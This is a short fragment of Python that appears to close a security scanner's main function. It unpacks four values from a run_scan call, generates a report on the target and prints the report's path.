    # FIX #4 — unpack all 4 values returned by run_scan
    findings, folder, chain_engine, tech_stack = run_scan(args.target, args)

    # Use the chain_engine and tech_stack returned from run_scan — do NOT instantiate new ones
    report_path = generate_report(findings, folder, args.target, chain_engine, tech_stack, mcp)

    console.print(f"[bold green]✅ Done. Report: {report_path}[/bold green]")


if __name__ == "__main__":
    main()
